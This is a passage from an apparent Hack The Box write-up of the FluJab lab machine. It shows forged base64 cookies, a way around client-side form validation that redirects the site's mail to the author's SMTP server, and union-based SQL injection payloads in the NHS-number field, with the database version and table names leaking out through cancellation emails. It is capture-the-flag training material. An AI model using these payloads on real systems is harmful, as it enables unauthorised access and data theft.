&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;modus--configurenull&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Modus&lt;/code&gt; = &lt;code class=&quot;highlighter-rouge&quot;&gt;Configure=Null&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;registered---f991b5fb6a2939471c7230b2db78225enull&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Registered&lt;/code&gt;  = &lt;code class=&quot;highlighter-rouge&quot;&gt;f991b5fb6a2939471c7230b2db78225e=Null&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;registered-is-using-the-same-hash-from-patient-after-some-guesses-i-found-that-this-hash-is-for-my-ip-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Registered&lt;/code&gt; is using the same hash from &lt;code class=&quot;highlighter-rouge&quot;&gt;Patient&lt;/code&gt;, After some guesses I found that this hash is for my ip :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;anyway-we-can-try-to-change-these-values-from-null-to-true-and-see-what-happens-&quot;&gt;Anyway we can try to change these values from &lt;code class=&quot;highlighter-rouge&quot;&gt;Null&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;True&lt;/code&gt; and see what happens :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/27.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;request--1&quot;&gt;Request :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /?smtp_config HTTP/1.1
Host: freeflujab.htb
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQo%3d
Connection: close
Upgrade-Insecure-Requests: 1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;response--1&quot;&gt;Response :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
Date: Thu, 15 Jun 2019 10:34:17 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Server: ClownWare Proxy
Content-Length: 3735
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;great-we-can-access-the-page-now&quot;&gt;Great, we can access the page now.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;before-doing-anything-i-noticed-this-message-about-the-whitelist&quot;&gt;Before doing anything I noticed this message about the whitelist:&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/32.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-requested-whitelist-and-looked-at-the-response-&quot;&gt;I requested &lt;code class=&quot;highlighter-rouge&quot;&gt;/?whitelist&lt;/code&gt; and looked at the response :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/34.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;my-ip-wasnt-there-anyway-i-used-python-to-run-a-debugging-smtp-server-&quot;&gt;My ip wasn’t there. Anyway I used python to run a debugging &lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; server :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python -m smtpd -n -c DebuggingServer 10.10.xx.xx:25&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/flujab/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-went-to-update-the-smtp-settings-and-add-mine-&quot;&gt;Then I went to update the &lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; settings and add mine :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-i-got-this-message--a-valid-smtp-domain-address-is-required-so-i-checked-the-source-of-the-form-&quot;&gt;But I got this message : &lt;code class=&quot;highlighter-rouge&quot;&gt;A Valid SMTP Domain Address Is Required&lt;/code&gt;. So I checked the source of the form :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;form method=&quot;post&quot; action=&quot;?smtp_config&quot;&amp;gt;
	&amp;lt;div class=&quot;row aln-center&quot;&amp;gt;
		&amp;lt;div class=&quot;col-6 &quot;&amp;gt;
				&amp;lt;input type=&quot;text&quot; name=&quot;mailserver&quot; id=&quot;email-server&quot; value=&quot;smtp.flujab.htb&quot; pattern=&quot;smtp.[A-Za-z]{1,255}.[A-Za-z]{2,5}&quot; title=&quot; A Valid SMTP Domain Address Is Required&quot;/&amp;gt;
				&amp;lt;input type=&quot;hidden&quot; name=&quot;port&quot; id=&quot;port&quot; placeholder=&quot;25&quot; value=&quot;25&quot; /&amp;gt;
		&amp;lt;/div&amp;gt;
		&amp;lt;div class=&quot;col-12&quot;&amp;gt;
		&amp;lt;p&amp;gt;
			WARNING: Only &amp;lt;a href=&quot;/?whitelist&quot;&amp;gt;whitelisted sysadmins&amp;lt;/a&amp;gt; are authorized to 
			access this page! &amp;lt;br \&amp;gt; If you are not supposed to 
			change these settings then don't! whitelist will be 
			auto-updated.
		&amp;lt;/p&amp;gt;
			&amp;lt;ul class=&quot;actions&quot;&amp;gt;
				&amp;lt;li&amp;gt;&amp;lt;input type=&quot;submit&quot; class=&quot;style1&quot; value=&quot;Save Mail Server Config&quot; name=&quot;save&quot; /&amp;gt;&amp;lt;/li&amp;gt;
			&amp;lt;/ul&amp;gt;
		&amp;lt;/div&amp;gt;
	&amp;lt;/div&amp;gt;
&amp;lt;/form&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;its-relying-on-client-side-validation-check-&quot;&gt;It’s relying on client-side validation check :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;which-means-that-we-can-bypass-it-easily-by-sending-the-data-directly-in-the-request-&quot;&gt;Which means that we can bypass it easily by sending the data directly in the request :&lt;/h4&gt;
&lt;h4 id=&quot;request--2&quot;&gt;Request :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /?smtp_config HTTP/1.1
Host: freeflujab.htb
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQo%3d
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 59

mailserver=10.10.xx.xx&amp;amp;port=25&amp;amp;save=Save+Mail+Server+Config
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/41.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/42.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;note--i-checked-whitelist-again-and-my-ip-was-added-there-after-i-added-it-in-the-smtp-server-configuration&quot;&gt;Note : I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;/?whitelist&lt;/code&gt; again and my ip was added there after I added it in the &lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; server configuration&lt;/h4&gt;
&lt;h4 id=&quot;in-the-patients-section-there-were-some-pages-to-book-an-appointment-book-send-a-reminder-remind-or-to-cancel-an-appointment-cancel-to-book-an-appointment-we-need-a-valid-patients-name-after-some-enumeration-i-found-some-names-in-info-&quot;&gt;In the patients section there were some pages to book an appointment (&lt;code class=&quot;highlighter-rouge&quot;&gt;/?book&lt;/code&gt;), send a reminder (&lt;code class=&quot;highlighter-rouge&quot;&gt;/?remind&lt;/code&gt;) or to cancel an appointment (&lt;code class=&quot;highlighter-rouge&quot;&gt;/?cancel&lt;/code&gt;). To book an appointment we need a valid patient’s name. After some enumeration I found some names in &lt;code class=&quot;highlighter-rouge&quot;&gt;/?info&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/43.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-took-b-smith-and-after-some-guesses-i-got-the-right-name-which-was-bob-smith-&quot;&gt;I took B. Smith and after some guesses I got the right name which was Bob Smith :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/44.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/45.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-email-was-sent-and-we-can-see-that-in-the-python-smtp-server-&quot;&gt;The email was sent and we can see that in the python &lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; server :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/46.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------                                                                                                       
Date: Thu, 13 Jun 2019 14:47:23 +0100                                                                                                       
To: bobsmith1975@gmail.com                                                                                                                  
From: Nurse Julie &amp;lt;DutyNurse@flujab.htb&amp;gt;
Subject: Flu Jab Appointment - Ref:NHS-943-475-5911
Message-ID: &amp;lt;e1f9b14325c78abda96f5dd82694b7a4@freeflujab.htb&amp;gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124



  Dear Mr Bob Smith,

  Here are the details of your appointment at our surgery.
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : NHS-943-475-5911
    Code   : Influ-022
    Type   : Injection
    Time   : 09:00
    Date   : 2018-11-30
    LOC    : Crick026
  ________________________

  We look forward to seeing you.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-tried-to-go-to-cancel-&quot;&gt;I tried to go to &lt;code class=&quot;highlighter-rouge&quot;&gt;/?cancel&lt;/code&gt; :&lt;/h4&gt;
&lt;h4 id=&quot;request--3&quot;&gt;Request :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/47.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /?cancel HTTP/1.1
Host: freeflujab.htb
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQo%3d
Connection: close
Upgrade-Insecure-Requests: 1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;response--2&quot;&gt;Response :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/48.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
HTTP/1.1 302 Found
Date: Thu, 13 Jun 2019 13:50:05 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Location: /?ERROR=NOT_REGISTERED
Server: ClownWare Proxy
Content-Length: 2060
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;it-redirected-me-to-errornot_registered-i-looked-at-the-older-requests-and-i-noticed-the-set-cookie-headers-&quot;&gt;It redirected me to &lt;code class=&quot;highlighter-rouge&quot;&gt;/?ERROR=NOT_REGISTERED&lt;/code&gt;. I looked at the older requests and I noticed the &lt;code class=&quot;highlighter-rouge&quot;&gt;Set-Cookie&lt;/code&gt; headers :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/49.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-added-the-info-about-expiration-max-age-and-path-to-my-cookies-and-tried-again-&quot;&gt;So I added the info about expiration, max age and path to my cookies and tried again :&lt;/h4&gt;
&lt;h4 id=&quot;request--4&quot;&gt;Request :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/50.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /?cancel HTTP/1.1
Host: freeflujab.htb
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; expires=Thu, 13-Jun-2019 14:04:38 GMT; Max-Age=3600; path=/?smtp_config; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQ%3D%3D; expires=Thu, 13-Jun-2019 14:04:38 GMT; Max-Age=3600; path=/
Connection: close
Upgrade-Insecure-Requests: 1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;response--3&quot;&gt;Response :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/51.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
Date: Thu, 13 Jun 2019 13:58:23 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Server: ClownWare Proxy
Content-Length: 5128
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/52.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/53.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;to-cancel-an-appointment-we-need-to-provide-the-nhs-number-of-the-patient-however-like-on-the-smtp-configuration-page-it-used-client-side-validation-check-&quot;&gt;To cancel an appointment we need to provide the NHS number of the patient. However like on the &lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; configuration page it used client-side validation check :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/54.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;input type=&quot;text&quot; name=&quot;nhsnum&quot; placeholder=&quot;NHS Number Required&quot; pattern=&quot;NHS-\d{3}-\d{3}-\d{4}&quot; title=&quot; A Valid NHS Number Is Required e.g. NHS-012-345-6789&quot; required&amp;gt;&amp;lt;/br&amp;gt;
  &amp;lt;ul class=&quot;actions&quot;&amp;gt;
    &amp;lt;center&amp;gt;&amp;lt;input type=&quot;submit&quot; class=&quot;style1&quot; value=&quot;Cancel Appointment&quot; name=&quot;submit&quot; /&amp;gt;&amp;lt;/center&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/55.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;request--5&quot;&gt;Request :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/56.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /?cancel HTTP/1.1
Host: freeflujab.htb
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://freeflujab.htb/?cancel
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; expires=Thu, 13-Jun-2019 14:04:38 GMT; Max-Age=3600; path=/?smtp_config; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQ%3D%3D; expires=Thu, 13-Jun-2019 14:04:38 GMT; Max-Age=3600; path=/
Connection: close
Upgrade-Insecure-Requests: 1

nhsnum=test&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;response--4&quot;&gt;Response :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/57.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
Date: Thu, 13 Jun 2019 14:13:42 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Server: ClownWare Proxy
Content-Length: 5204
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;now-if-we-check-the-smtp-server-we-can-see-that-the-cancellation-email-was-sent-successfully-&quot;&gt;Now if we check the &lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; server we can see that the cancellation email was sent successfully :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/58.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 15:13:40 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
Subject: Flu Jab Appointment - Ref:
Message-ID: &amp;lt;219504b93c84fb0e94fef1ae3d31707d@freeflujab.htb&amp;gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : test
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;sqli&quot;&gt;SQLi&lt;/h3&gt;
&lt;h4 id=&quot;i-tried-to-play-around-with-that-input-nhsnum-i-tried-a-lot-of-stuff-and-when-i-tried-union-based-sql-injection-i-got-a-hit-a-good-reference&quot;&gt;I tried to play around with that input (&lt;code class=&quot;highlighter-rouge&quot;&gt;nhsnum&lt;/code&gt;), I tried a lot of stuff and when I tried union based &lt;code class=&quot;highlighter-rouge&quot;&gt;sql&lt;/code&gt; injection I got a hit (a good &lt;a href=&quot;http://www.securityidiots.com/Web-Pentest/SQL-Injection/Basic-Union-Based-SQL-Injection.html&quot;&gt;reference&lt;/a&gt;):&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/59.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,@@datadir,4,5;#&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;this-payload-prints-the-data-directory&quot;&gt;This payload prints the data directory.&lt;/h4&gt;
&lt;h4 id=&quot;smtp-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/60.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 15:20:32 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
Subject: Flu Jab Appointment - Ref:/var/lib/mysql/
Message-ID: &amp;lt;9bcabe79f1782598002cc31abc3bb333@freeflujab.htb&amp;gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,@@datadir,4,5;#
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;database-version-&quot;&gt;Database version :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/61.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,@@version,4,5;#&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;smtp--1&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/62.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 15:24:50 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
Subject: Flu Jab Appointment - Ref:10.1.37-MariaDB-0+deb9u1
Message-ID: &amp;lt;d2e238de2ef64c5dd385e30472c94d5e@freeflujab.htb&amp;gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,@@version,4,5;#
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;great-lets-get-the-table-name-&quot;&gt;Great. Let’s get the table name :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/63.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,table_name,4,5 from information_schema.tables where table_schema=database()--+&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;smtp--2&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/64.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 15:28:15 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
Subject: Flu Jab Appointment - Ref:admin
Message-ID: &amp;lt;e389b6f96e0104edf7b12bd167666fb3@freeflujab.htb&amp;gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,table_name,4,5 from information_schema.tables where table_schema=database()--                              
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.
